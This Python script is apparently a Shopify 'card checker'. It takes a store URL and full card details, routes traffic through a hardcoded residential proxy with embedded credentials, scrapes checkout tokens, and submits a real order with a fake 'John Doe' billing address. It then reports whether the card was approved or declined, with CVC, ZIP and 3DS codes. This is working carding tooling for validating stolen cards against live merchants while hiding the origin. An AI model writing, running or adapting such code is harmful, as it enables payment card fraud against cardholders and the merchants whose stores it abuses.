import os
PROXY = "http://qjpthvmsomfj-country-NL:x9gcvk7scvy3@lite.flashproxy.io:6969"
os.environ["HTTP_PROXY"]  = PROXY
os.environ["HTTPS_PROXY"] = PROXY
os.environ["ALL_PROXY"]   = PROXY
os.environ["NO_PROXY"]    = ""

import asyncio
import re
import logging
from typing import Optional, Dict, Any
from urllib.parse import urlparse

import httpx
import json
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
from faker import Faker
import random
import string

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Global instances ---
fake = Faker()

# --- Constants ---
HTTP_TIMEOUT = httpx.Timeout(30.0, connect=10.0)

CURRENCY_TO_COUNTRY = {
    'USD': 'US', 'EUR': 'EU', 'GBP': 'GB', 'INR': 'IN',
    'AUD': 'AU', 'CAD': 'CA', 'JPY': 'JP', 'CNY': 'CN',
    'BRL': 'BR', 'RUB': 'RU', 'MXN': 'MX', 'ZAR': 'ZA',
    'CHF': 'CH', 'SEK': 'SE', 'NZD': 'NZ',
}

COUNTRY_TO_SYMBOL = {
    'US': '$', 'EU': '€', 'GB': '£', 'IN': '₹',
    'AU': 'A$', 'CA': 'C$', 'JP': '¥', 'CN': '¥',
    'BR': 'R$', 'RU': '₽', 'MX': 'Mex$', 'ZA': 'R',
    'CH': 'CHF', 'SE': 'kr', 'NZ': 'NZ$',
}

# --- Helper Functions ---

def generate_random_string(length: int = 10) -> str:
    """Generate random alphanumeric string"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def extract_domain(url: str) -> str:
    """Extract domain from URL"""
    try:
        domain = urlparse(url).netloc
        if not domain:
            raise ValueError("Empty domain")
        return domain
    except Exception as e:
        logger.error(f"extract_domain error: {e}")
        raise

def find_between(s: Optional[str], first: str, last: str) -> Optional[str]:
    """
    Find substring between two delimiters - SAFE for None values.
    This is critical to prevent passing None to HTTP headers!
    """
    try:
        if not s or not isinstance(s, str):
            return None
        if not first or not last:
            return None
        
        start = s.find(first)
        if start == -1:
            return None
        start += len(first)
        
        end = s.find(last, start)
        if end == -1:
            return None
        
        result = s[start:end]
        return result if result.strip() else None
    except Exception as e:
        logger.warning(f"find_between error: {e}")
        return None

def get_country_code_from_currency(currency_code: Optional[str]) -> str:
    """Get country code from currency code"""
    if not currency_code or not isinstance(currency_code, str):
        return 'US'
    return CURRENCY_TO_COUNTRY.get(currency_code.upper(), 'US')

def get_sym_from_country_code(country_code: Optional[str]) -> str:
    """Get currency symbol from country code"""
    if not country_code or not isinstance(country_code, str):
        return '$'
    return COUNTRY_TO_SYMBOL.get(country_code.upper(), '$')

def sanitize_header_value(value: Any) -> Optional[str]:
    """
    CRITICAL: Convert value to valid HTTP header string or None.
    Returns None if value is None or empty.
    
    This prevents the error:
    "Header value must be str or bytes, not <class 'NoneType'>"
    """
    if value is None:
        return None
    
    if isinstance(value, str):
        stripped = value.strip()
        return stripped if stripped else None
    
    try:
        s = str(value).strip()
        return s if s else None
    except Exception as e:
        logger.warning(f"sanitize_header_value error for {type(value)}: {e}")
        return None

async def get_variant_and_token(
    collection_url: str,
    cc_number: str,
    cc_month: str,
    cc_year: str,
    cc_cvv: str
) -> Optional[Dict[str, Any]]:
    """
    Main function to process Shopify card check.
    Returns validated response dict or None on critical failure.
    """
    try:
        # Validate inputs
        if not all([collection_url, cc_number, cc_month, cc_year, cc_cvv]):
            raise ValueError("Missing required parameters")
        
        if not (collection_url.startswith("http://") or collection_url.startswith("https://")):
            raise ValueError("Invalid collection URL")
        
        logger.info(f"Starting card check for {collection_url}")
        
        # Create HTTP client with connection pooling
        async with httpx.AsyncClient(
            timeout=HTTP_TIMEOUT,
            follow_redirects=True,
            http2=True,
            limits=httpx.Limits(max_keepalive_connections=10, max_connections=20)
        ) as session:
            
            user_agent = generate_user_agent()
            
            # ===== STEP 1: Fetch collection page =====
            try:
                response = await session.get(collection_url, headers={"User-Agent": user_agent})
                response.raise_for_status()
            except httpx.HTTPError as e:
                raise Exception(f"Failed to load collection page: {e}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            product_link_tag = soup.select_one('a[href*="/products/"]')
            
            if not product_link_tag or not product_link_tag.get('href'):
                raise Exception("No product link found")
            
            product_href = product_link_tag['href']
            base_domain = extract_domain(collection_url)
            product_url = f"https://{base_domain}{product_href}" if not product_href.startswith("http") else product_href
            logger.info(f"Product URL: {product_url}")
            
            # ===== STEP 2: Load product page & extract variant =====
            try:
                response = await session.get(product_url, headers={"User-Agent": user_agent})
                response.raise_for_status()
            except httpx.HTTPError as e:
                raise Exception(f"Failed to load product page: {e}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            variant_script = None
            
            for script in soup.find_all("script"):
                if script.text and "variants" in script.text:
                    variant_script = script.text
                    break
            
            if not variant_script:
                raise Exception("No variant script found")
            
            try:
                variant_start = variant_script.find('variants')
                variant_end = variant_script.find(']', variant_start)
                if variant_start == -1 or variant_end == -1:
                    raise ValueError("Malformed variant data")
                
                variant_data = variant_script[variant_start:variant_end + 1]
                variant_ids = list(set(re.findall(r'"id":\s*(\d+)', variant_data)))
                
                if not variant_ids:
                    raise Exception("No variant IDs found")
            except Exception as e:
                raise Exception(f"Failed to parse variants: {e}")
            
            product_variant_id = variant_ids[0]
            product_gid = f"gid://shopify/ProductVariant/{product_variant_id}"
            product_merchandise_gid = f"gid://shopify/ProductVariantMerchandise/{product_variant_id}"
            
            base_url = product_url.split("/products/")[0]
            add_to_cart_url = f"{base_url}/cart/add.js"
            cart_url = f"{base_url}/cart.js"
            
            # ===== STEP 3: Add to cart & get token =====
            try:
                await session.post(
                    add_to_cart_url,
                    data={"id": product_variant_id, "quantity": 1},
                    headers={"User-Agent": user_agent}
                )
            except Exception as e:
                logger.warning(f"Add to cart failed (non-critical): {e}")
            
            try:
                cart_resp = await session.get(cart_url, headers={"User-Agent": user_agent})
                cart_resp.raise_for_status()
                cart_data = cart_resp.json()
                cart_token = cart_data.get('token')
                
                if not cart_token:
                    raise Exception("No cart token in response")
            except Exception as e:
                raise Exception(f"Failed to get cart token: {e}")
            
            # ===== STEP 4: Fetch checkout page =====
            checkout_url = f"{base_url}/checkout"
            try:
                checkout_resp = await session.post(
                    url=checkout_url,
                    headers={"User-Agent": user_agent},
                    data={},
                    follow_redirects=True
                )
                checkout_resp.raise_for_status()
                html = checkout_resp.text
            except Exception as e:
                raise Exception(f"Checkout fetch error: {e}")
            
            # ===== STEP 5: Extract all required tokens =====
            x_checkout_one_session_token = find_between(html, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = find_between(html, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(html, 'stableId&quot;:&quot;', '&quot;')
            paymentMethodIdentifier = find_between(html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            amount = find_between(html, '&quot;amount&quot;:&quot;', '&quot;')
            currency = find_between(html, '&quot;currencyCode&quot;:&quot;', '&quot;')
            
            # Validate all critical fields
            required_fields = {
                'x_checkout_one_session_token': x_checkout_one_session_token,
                'queue_token': queue_token,
                'stable_id': stable_id,
                'paymentMethodIdentifier': paymentMethodIdentifier,
                'amount': amount,
                'currency': currency,
            }
            
            for field_name, field_value in required_fields.items():
                if not field_value:
                    raise Exception(f"Missing critical field: {field_name}")
            
            country_code = get_country_code_from_currency(currency)
            logger.info(f"Extracted tokens - Amount: {amount}, Currency: {currency}")
            
            # ===== STEP 6: Create payment session =====
            domain = extract_domain(product_url)
            shopify_url = "https://checkout.pci.shopifyinc.com/sessions"
            
            json_data = {
                "credit_card": {
                    "number": cc_number,
                    "month": cc_month,
                    "year": cc_year,
                    "verification_value": cc_cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": "John Doe"
                },
                "payment_session_scope": domain
            }
            
            try:
                shopify_resp = await session.post(shopify_url, headers={"User-Agent": user_agent, "Content-Type": "application/json"}, json=json_data)
                shopify_resp.raise_for_status()
                sessionid = shopify_resp.json().get("id")
                
                if not sessionid:
                    raise Exception("No session ID in response")
            except Exception as e:
                raise Exception(f"Failed to create payment session: {e}")
            
            logger.info(f"Payment session created: {sessionid}")
            
            # ===== STEP 7: Submit proposal =====
            purl = f"https://{domain}/checkouts/unstable/graphql"
            
            headers = {
                'authority': domain,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f'https://{domain}',
                'referer': f'https://{domain}/',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agent,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': cart_token,
            }
            
            # CRITICAL FIX: Filter out None values to prevent header errors
            headers = {k: v for k, v in headers.items() if v is not None}
            
            json_data = {
                'operationName': 'Proposal',
                'variables': {
                    'sessionInput': {'sessionToken': x_checkout_one_session_token},
                    'queueToken': queue_token,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True},
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                            'deliveryMethodTypes': ['NONE'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True,
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': product_merchandise_gid,
                                    'variantId': product_gid,
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': amount, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        }],
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '123 Main St',
                                'address2': '',
                                'city': 'New York',
                                'countryCode': 'US',
                                'postalCode': '10001',
                                'firstName': 'John',
                                'lastName': 'Doe',
                                'zoneCode': 'NY',
                                'phone': '',
                            },
                        },
                    },
                },
            }
            
            try:
                await session.post(url=purl, headers=headers, json=json_data)
            except Exception as e:
                logger.warning(f"Proposal request failed (non-critical): {e}")
            
            # ===== STEP 8: Submit for completion =====
            gurl = f"https://{domain}/checkouts/unstable/graphql"
            headers = {
                'authority': domain,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f'https://{domain}',
                'referer': f'https://{domain}/',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agent,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': '4ff4c7662f7b13ef1331706dfb24721ea40ad8d6',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': cart_token,
            }
            
            # Filter None values
            headers = {k: v for k, v in headers.items() if v is not None}
            
            json_data = {
                'operationName': 'SubmitForCompletion',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': x_checkout_one_session_token},
                        'queueToken': queue_token,
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                'deliveryMethodTypes': ['NONE'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True,
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': True,
                            'prefetchShippingRatesStrategy': None,
                            'interfaceFlow': 'SHOPIFY',
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': product_merchandise_gid,
                                        'variantId': product_gid,
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'value': {'amount': amount, 'currencyCode': currency}},
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            }],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': sessionid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '123 Main St',
                                                'city': 'New York',
                                                'countryCode': 'US',
                                                'postalCode': '10001',
                                                'firstName': 'John',
                                                'lastName': 'Doe',
                                                'phone': '',
                                            },
                                        },
                                        'cardSource': None,
                                    },
                                },
                                'amount': {'value': {'amount': amount, 'currencyCode': currency}},
                            }],
                        },
                    },
                    'attemptToken': f'{cart_token}-1np4i453ps',
                },
            }
            
            try:
                completion_resp = await session.post(url=gurl, headers=headers, json=json_data)
                completion_resp.raise_for_status()
                res_json = completion_resp.json()
            except Exception as e:
                raise Exception(f"Completion request failed: {e}")
            
            # Extract receipt ID
            try:
                bill = res_json.get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
                if not bill:
                    raise Exception("No receipt ID in response")
            except Exception as e:
                raise Exception(f"Failed to extract receipt ID: {e}")
            
            # ===== STEP 9: Poll for receipt =====
            await asyncio.sleep(2)
            
            url = f"https://{domain}/checkouts/unstable/graphql"
            headers = {
                'authority': domain,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f'https://{domain}',
                'referer': f'https://{domain}/',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agent,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-source-id': cart_token,
            }
            
            headers = {k: v for k, v in headers.items() if v is not None}
            
            json_data = {
                'operationName': 'PollForReceipt',
                'variables': {
                    'receiptId': bill,
                    'sessionToken': x_checkout_one_session_token,
                },
            }
            
            try:
                poll_resp = await session.post(url=url, headers=headers, json=json_data)
                poll_resp.raise_for_status()
                res_json = poll_resp.json()
            except Exception as e:
                raise Exception(f"Receipt poll failed: {e}")
            
            # Extract result
            result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
            sym = get_sym_from_country_code(country_code)
            
            # Process response codes
            if "shopify_payments" in str(res_json):
                return {"amount": f"{sym}{amount}", "result": "ORDER_PLACED", "status": "approved", "currency": currency, "country": country_code, "code": "00"}
            
            result_map = {
                'CARD_DECLINED': ("CARD_DECLINED", "declined", "05"),
                'INCORRECT_NUMBER': ("INCORRECT_NUMBER", "error", "14"),
                'GENERIC_ERROR': ("GENERIC_ERROR", "error", "96"),
                'AUTHENTICATION_FAILED': ("3DS_REQUIRED", "requires_auth", "3D"),
            }
            
            if result in result_map:
                res, status, code = result_map[result]
                return {"amount": f"{sym}{amount}", "result": res, "status": status, "currency": currency, "country": country_code, "code": code}
            
            string_checks = {
                'FRAUD_SUSPECTED': ("FRAUD_SUSPECTED", "declined", "59"),
                'INCORRECT_ADDRESS': ("MISMATCHED_BILLING", "declined", "A1"),
                'INCORRECT_ZIP': ("MISMATCHED_ZIP", "declined", "Z1"),
                'INCORRECT_PIN': ("MISMATCHED_PIN", "declined", "55"),
                'INSUFFICIENT_FUNDS': ("INSUFFICIENT_FUNDS", "declined", "51"),
                'INVALID_CVC': ("INVALID_CVC", "declined", "N7"),
                'INCORRECT_CVC': ("INVALID_CVC", "declined", "N7"),
                'CompletePaymentChallenge': ("3DS_REQUIRED", "requires_auth", "3D"),
            }
            
            res_str = str(res_json)
            for check_str, (res, status, code) in string_checks.items():
                if check_str in res_str:
                    return {"amount": f"{sym}{amount}", "result": res, "status": status, "currency": currency, "country": country_code, "code": code}
            
            if result:
                return {"amount": f"{sym}{amount}", "result": result, "status": "unknown", "currency": currency, "country": country_code, "code": "XX"}
            
            return {"amount": f"{sym}{amount}", "result": "MISMATCHED_BILLING", "status": "declined", "currency": currency, "country": country_code, "code": "A1"}
    
    except Exception as e:
        logger.error(f"Critical processing error: {e}", exc_info=True)
        return None
